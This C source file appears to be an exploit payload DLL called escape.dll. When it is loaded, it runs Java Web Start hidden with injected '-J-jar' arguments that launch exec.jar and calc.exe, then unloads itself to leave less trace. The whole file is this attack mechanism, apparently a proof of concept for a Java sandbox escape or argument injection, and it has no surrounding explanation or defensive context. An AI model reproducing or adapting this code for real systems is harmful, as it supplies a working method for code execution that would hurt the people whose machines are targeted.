/************************************************************


************************************************************/
#include "stdafx.h"
#include "process.h"
#include "windows.h"
#include "stdio.h"
#include "stdlib.h"
#include "Shellapi.h"

#define BUFSIZE MAX_PATH
char CWD[BUFSIZE];
char args[1000]="";


static char *last_strstr(const char *haystack, const char *needle)
{
    if (*needle == '\0')
        return (char *) haystack;

    char *result = NULL;
    for (;;) {
        char *p = strstr(haystack, needle);
        if (p == NULL)
            break;
        result = p;
        haystack = p + 1;
    }
	return result;

}

BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
					 )
{

	char *pos;
	HMODULE mod;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		mod = GetModuleHandle("escape.dll");
		GetModuleFileName(mod,CWD,BUFSIZE);
		pos = last_strstr(CWD,"\\");
		pos[0]=0;

		strcpy(args,"-J-jar -J\"");
		strcat(args,CWD);
		strcat(args,"\\exec.jar\" -J\"");
		strcat(args,CWD);
		strcat(args,"\\calc.exe\" a.jnlp");
				
		ShellExecute(0,0,"javaws.exe",args,CWD,0);

	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	// Force automatic unload
	return FALSE;
}

